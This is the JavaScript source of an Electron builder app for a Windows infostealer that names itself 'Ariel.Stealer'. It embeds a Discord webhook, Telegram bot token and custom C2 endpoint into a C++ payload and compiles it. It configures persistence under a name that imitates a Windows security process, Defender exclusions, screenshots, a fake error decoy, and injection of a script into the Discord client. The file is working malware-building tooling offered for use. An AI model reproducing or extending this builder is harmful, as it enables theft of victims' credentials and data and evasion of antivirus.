const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const { spawn, spawnSync } = require('child_process');
const path = require('path');
const fs = require('fs');

const root = __dirname;
const configPath = path.join(root, 'builder-config.json');
app.setPath('userData', path.join(process.env.TEMP || root, 'ariel-builder-userdata'));

function createWindow() {
  const window = new BrowserWindow({
    width: 400,
    height: 960,
    resizable: false,
    webPreferences: {
      preload: path.join(root, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });
  window.setMenu(null);
  window.loadFile(path.join(root, 'index.html'));
}

app.whenReady().then(createWindow);
app.on('window-all-closed', () => {
  if (process.platform !== 'win32') app.quit();
});

ipcMain.handle('pickIcon', async () => {
  const result = await dialog.showOpenDialog({
    properties: ['openFile'],
    filters: [{ name: 'Icon', extensions: ['ico'] }],
  });
  return result.canceled ? '' : result.filePaths[0];
});

ipcMain.handle('loadConfig', async () => {
  try {
    return JSON.parse(fs.readFileSync(configPath, 'utf8'));
  } catch (error) {
    return null;
  }
});

ipcMain.handle('saveConfig', async (_event, values) => {
  fs.writeFileSync(configPath, JSON.stringify(values, null, 2));
  return configPath;
});

function sendStatus(text) {
  for (const window of BrowserWindow.getAllWindows()) {
    if (!window.isDestroyed()) window.webContents.send('build-status', text);
  }
}

function exec(command, args, options = {}) {
  return new Promise((resolve) => {
    const child = spawn(command, args, {
      cwd: options.cwd || root,
      windowsHide: options.windowsHide !== false,
    });
    let stdout = '';
    let stderr = '';
    const echo = options.echo !== false;
    if (child.stdout) child.stdout.setEncoding('utf8');
    if (child.stderr) child.stderr.setEncoding('utf8');
    if (child.stdout) child.stdout.on('data', (chunk) => {
      stdout += chunk;
      if (echo) process.stdout.write(chunk);
    });
    if (child.stderr) child.stderr.on('data', (chunk) => {
      stderr += chunk;
      if (echo) process.stderr.write(chunk);
    });

    let timer = null;
    if (options.timeout) timer = setTimeout(() => child.kill(), options.timeout);
    const finish = (status, error) => {
      if (timer) clearTimeout(timer);
      resolve({ status, stdout, stderr, error });
    };
    child.on('error', (error) => finish(-1, error));
    child.on('close', (status) => finish(status, null));
  });
}

async function run(command, args) {
  const label = path.basename(command);
  sendStatus('running ' + label + '...');
  console.log('\n[ariel] $ ' + label + ' ' + args.join(' '));
  const result = await exec(command, args);
  console.log('[ariel] ' + label + ' exit=' + result.status);
  if (result.error) throw result.error;
  if (result.status !== 0)
    throw new Error((result.stderr || result.stdout || 'command failed').trim().slice(-400));
  return result.stdout;
}

function psQuote(value) {
  return "'" + String(value).replace(/'/g, "''") + "'";
}

const CMAKE_VERSION = '3.30.5';
const CMAKE_ZIP = `cmake-${CMAKE_VERSION}-windows-x86_64.zip`;

function portableCMakePath() {
  const temp = process.env.TEMP || process.env.TMP || 'C:\\Windows\\Temp';
  return path.join(temp, 'ariel_cmake', `cmake-${CMAKE_VERSION}-windows-x86_64`, 'bin', 'cmake.exe');
}

async function downloadWithCurl(url, zip) {
  sendStatus('downloading portable CMake...');
  const result = await exec('curl.exe', [
    '-L', '--fail', '--retry', '3', '--retry-delay', '2',
    '--connect-timeout', '20', '--max-time', '300', '-o', zip, url,
  ], { timeout: 310000 });
  if (result.error) return result.error.message;
  if (result.status !== 0)
    return (result.stderr || result.stdout || 'curl failed').trim().slice(-300);
  return '';
}

async function downloadWithPowerShell(url, zip) {
  sendStatus('downloading portable CMake...');
  const command = `$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri '${url}' -OutFile ${psQuote(zip)}`;
  const result = await exec('powershell.exe',
    ['-NoProfile', '-WindowStyle', 'Hidden', '-Command', command],
    { timeout: 310000 });
  if (result.error) return result.error.message;
  if (result.status !== 0)
    return (result.stderr || result.stdout || 'Invoke-WebRequest failed').trim().slice(-300);
  return '';
}

async function extractCMake(zip, directory) {
  sendStatus('extracting portable CMake...');
  const command = `Expand-Archive -LiteralPath ${psQuote(zip)} -DestinationPath ${psQuote(directory)} -Force`;
  const result = await exec('powershell.exe',
    ['-NoProfile', '-WindowStyle', 'Hidden', '-Command', command],
    { timeout: 120000 });
  if (result.error) return result.error.message;
  if (result.status !== 0)
    return (result.stderr || result.stdout || 'extract failed').trim().slice(-300);
  return '';
}

async function downloadCMake() {
  const sources = [
    `https://cmake.org/files/v3.30/${CMAKE_ZIP}`,
    `https://github.com/Kitware/CMake/releases/download/v${CMAKE_VERSION}/${CMAKE_ZIP}`,
  ];
  const temp = process.env.TEMP || process.env.TMP || 'C:\\Windows\\Temp';
  const directory = path.join(temp, 'ariel_cmake');
  const zip = path.join(directory, 'cmake.zip');
  fs.mkdirSync(directory, { recursive: true });

  let lastError = 'no download source succeeded';
  for (const url of sources) {
    if (fs.existsSync(zip)) fs.unlinkSync(zip);

    let error = await downloadWithCurl(url, zip);
    if (error) error = await downloadWithPowerShell(url, zip);
    if (error) {
      lastError = url + ': ' + error;
      continue;
    }

    if (!fs.existsSync(zip) || fs.statSync(zip).size < 1000000) {
      lastError = url + ': downloaded file too small';
      continue;
    }

    error = await extractCMake(zip, directory);
    if (error) {
      lastError = url + ': ' + error;
      continue;
    }

    const found = portableCMakePath();
    if (fs.existsSync(found)) {
      const probe = spawnSync(found, ['--version'], { encoding: 'utf8', windowsHide: true });
      if (!probe.error && probe.status === 0) return { path: found, error: '' };
      lastError = url + ': extracted cmake failed to run';
    } else {
      lastError = url + ': cmake.exe missing after extract';
    }
  }

  return { path: '', error: lastError };
}

async function findCMake(explicit) {
  const programFiles = process.env.ProgramFiles || 'C:\\Program Files';
  const programFiles86 = process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)';
  const local = process.env.LOCALAPPDATA || '';
  const candidates = [];

  if (explicit) candidates.push(explicit);
  if (process.env.CMAKE) candidates.push(process.env.CMAKE);
  candidates.push('cmake');

  for (const edition of ['Community', 'Professional', 'Enterprise', 'BuildTools']) {
    candidates.push(path.join(programFiles, 'Microsoft Visual Studio', '2022', edition,
      'Common7', 'IDE', 'CommonExtensions', 'Microsoft', 'CMake', 'CMake', 'bin', 'cmake.exe'));
  }
  candidates.push(path.join(programFiles, 'CMake', 'bin', 'cmake.exe'));
  candidates.push(path.join(programFiles, 'Kitware', 'CMake', 'bin', 'cmake.exe'));
  candidates.push(path.join(programFiles86, 'CMake', 'bin', 'cmake.exe'));
  candidates.push('C:\\ProgramData\\chocolatey\\bin\\cmake.exe');
  if (local) candidates.push(path.join(local, 'Programs', 'CMake', 'bin', 'cmake.exe'));
  if (process.env.USERPROFILE) candidates.push(path.join(process.env.USERPROFILE, 'scoop', 'shims', 'cmake.exe'));
  candidates.push(portableCMakePath());

  for (const candidate of candidates) {
    if (!candidate) continue;
    if (candidate === 'cmake') {
      const probe = spawnSync('cmake', ['--version'], { encoding: 'utf8', windowsHide: true });
      if (!probe.error && probe.status === 0) return 'cmake';
    } else if (fs.existsSync(candidate)) {
      return candidate;
    }
  }
  throw new Error('cmake not found');
}

async function installCMakeWithWinget() {
  sendStatus('installing CMake with winget...');
  const result = await exec('winget', [
    'install', '--id', 'Kitware.CMake', '-e',
    '--accept-source-agreements', '--accept-package-agreements', '--silent',
  ], { windowsHide: false, timeout: 600000 });
  if (result.error) throw new Error('winget unavailable');
  if (result.status !== 0)
    throw new Error((result.stderr || result.stdout || 'winget install failed').trim().slice(-400));
}

async function ensureCMake(explicit) {
  try {
    return await findCMake(explicit);
  } catch (error) {
  }

  const answer = await dialog.showMessageBox({
    type: 'question',
    buttons: ['Download portable CMake', 'Install with winget', 'Open download page', 'Cancel'],
    defaultId: 0,
    cancelId: 3,
    title: 'CMake not found',
    message: 'CMake was not found.',
    detail: 'Choose an install method, or set the CMake path field in the builder.',
  });

  if (answer.response === 0) {
    const result = await downloadCMake();
    if (result.path) return result.path;
    throw new Error('portable CMake download failed: ' + result.error);
  }
  if (answer.response === 1) {
    await installCMakeWithWinget();
    return await findCMake(explicit);
  }
  if (answer.response === 2) {
    shell.openExternal('https://cmake.org/download/');
    throw new Error('install CMake, then build again');
  }
  throw new Error('cmake not found');
}

function safeName(value) {
  const cleaned = String(value || '')
    .replace(/[\\/:*?"<>|\x00-\x1f]/g, '')
    .replace(/\s+/g, ' ')
    .trim();
  if (!cleaned) return 'ariel';
  return /^[A-Za-z0-9_-]/.test(cleaned) ? cleaned : 'ariel_' + cleaned;
}

function cppString(value) {
  return '"' + String(value || '')
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\r/g, '\\r')
    .replace(/\n/g, '\\n')
    .replace(/\t/g, '\\t') + '"';
}

function jsSingle(value) {
  return String(value || '')
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/\r/g, '\\r')
    .replace(/\n/g, '\\n');
}

function rcPath(value) {
  return '"' + String(value).replace(/\\/g, '/').replace(/"/g, '\\"') + '"';
}

function writeEmbeddedConfig(config) {
  const header = [
    '#pragma once',
    '',
    'namespace ariel::embedded {',
    `inline constexpr const char* discord_webhook = ${cppString(config.discord_webhook)};`,
    `inline constexpr const char* telegram_token = ${cppString(config.telegram_token)};`,
    `inline constexpr const char* telegram_chat_id = ${cppString(config.telegram_chat_id)};`,
    `inline constexpr const char* password = ${cppString(config.password)};`,
    `inline constexpr bool install = ${config.install ? 'true' : 'false'};`,
    `inline constexpr const char* startup_name = ${cppString(config.startup_name)};`,
    `inline constexpr const char* appdata_dir = ${cppString(config.appdata_dir)};`,
    `inline constexpr bool ping_everyone = ${config.ping_everyone ? 'true' : 'false'};`,
    `inline constexpr bool defender_exclusions = ${config.defender_exclusions ? 'true' : 'false'};`,
    `inline constexpr bool screenshot = ${config.screenshot ? 'true' : 'false'};`,
    `inline constexpr bool debug = ${config.debug ? 'true' : 'false'};`,
    `inline constexpr bool fake_error = ${config.fake_error ? 'true' : 'false'};`,
    `inline constexpr const char* fake_error_title = ${cppString(config.error_title)};`,
    `inline constexpr const char* fake_error_message = ${cppString(config.error_message)};`,
    `inline constexpr bool discord_injection = ${config.discord_injection ? 'true' : 'false'};`,
    `inline constexpr const char* thumbnail_url = ${cppString(config.thumbnail_url)};`,
    `inline constexpr const char* custom_c2_url = ${cppString(config.custom_c2_url)};`,
    `inline constexpr const char* custom_c2_file_field = ${cppString(config.custom_c2_file_field)};`,
    `inline constexpr const char* custom_c2_headers = ${cppString(config.custom_c2_headers)};`,
    `inline constexpr const char* custom_c2_fields = ${cppString(config.custom_c2_fields)};`,
    `inline constexpr const char* output = ${cppString(config.output)};`,
    '',
    '}  // namespace ariel::embedded',
    '',
  ].join('\n');
  fs.writeFileSync(path.join(root, 'src', 'embedded_config.hpp'), header);
}

function writeInjectionScript(config) {
  const source = fs.readFileSync(path.join(root, 'assets', 'injection.js'), 'utf8');
  const prepared = source.replace(/__ARIEL_WEBHOOK__/g, jsSingle(config.discord_webhook));
  const header = [
    '#pragma once',
    '',
    'namespace ariel::embedded_injection {',
    'inline constexpr const char* script = R"ariel_script(',
    prepared,
    ')ariel_script";',
    '}  // namespace ariel::embedded_injection',
    '',
  ].join('\n');
  fs.writeFileSync(path.join(root, 'src', 'embedded_injection.hpp'), header);
}

function writeBuildResources(config) {
  const iconTarget = path.join(root, 'src', 'ariel_icon.ico');
  let hasIcon = false;
  if (config.icon) {
    if (!fs.existsSync(config.icon)) throw new Error('icon file not found: ' + config.icon);
    fs.copyFileSync(config.icon, iconTarget);
    hasIcon = true;
  } else if (fs.existsSync(iconTarget)) {
    fs.unlinkSync(iconTarget);
  }

  const manifestPath = path.join(root, 'src', 'ariel.manifest');
  const level = config.require_admin ? 'requireAdministrator' : 'asInvoker';
  const manifest = [
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
    '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">',
    '  <assemblyIdentity version="1.0.0.0" processorArchitecture="amd64" name="Ariel.Stealer" type="win32"/>',
    '  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">',
    '    <security>',
    '      <requestedPrivileges>',
    `        <requestedExecutionLevel level="${level}" uiAccess="false"/>`,
    '      </requestedPrivileges>',
    '    </security>',
    '  </trustInfo>',
    '</assembly>',
    '',
  ].join('\r\n');
  fs.writeFileSync(manifestPath, manifest);

  const rc = [];
  if (hasIcon) rc.push('1 ICON ' + rcPath(iconTarget));
  rc.push('1 24 ' + rcPath(manifestPath));
  fs.writeFileSync(path.join(root, 'src', 'ariel.rc'), rc.join('\r\n') + '\r\n');
}

ipcMain.handle('build', async (_event, values) => {
  const config = {
    name: safeName(values.name),
    icon: values.icon || '',
    cmake: values.cmake || '',
    require_admin: Boolean(values.requireAdmin),
    discord_webhook: values.webhook || '',
    telegram_token: values.token || '',
    telegram_chat_id: values.chat || '',
    password: values.password || '',
    install: Boolean(values.install),
    startup_name: values.startupName || 'SecurityHealthSystray.exe',
    appdata_dir: values.appdataDir || 'SecurityHealthSystray',
    ping_everyone: Boolean(values.pingEveryone),
    defender_exclusions: Boolean(values.defender),
    screenshot: Boolean(values.screenshot),
    debug: Boolean(values.debug),
    fake_error: Boolean(values.fakeError),
    error_title: values.errorTitle || 'Error',
    error_message: values.errorMessage || '',
    discord_injection: Boolean(values.discordInjection),
    thumbnail_url: values.thumbnailUrl || '',
    custom_c2_url: values.c2url || '',
    custom_c2_file_field: values.c2field || 'file',
    custom_c2_headers: values.c2headers || '',
    custom_c2_fields: values.c2fields || '',
    output: '',
  };

  try {
    fs.writeFileSync(configPath, JSON.stringify(values, null, 2));
  } catch (error) {
  }
  writeEmbeddedConfig(config);
  writeInjectionScript(config);
  writeBuildResources(config);

  const cmake = await ensureCMake(config.cmake);
  const buildDir = path.join(root, 'build');
  await run(cmake, ['-S', root, '-B', buildDir, '-G', 'Visual Studio 17 2022', '-A', 'x64',
    `-DARIEL_OUTPUT_NAME=${config.name}`]);
  await run(cmake, ['--build', buildDir, '--config', 'Release']);
  fs.copyFileSync(path.join(buildDir, 'Release', `${config.name}.exe`),
    path.join(root, `${config.name}.exe`));
  return 'done: ' + config.name + '.exe with embedded config';
});
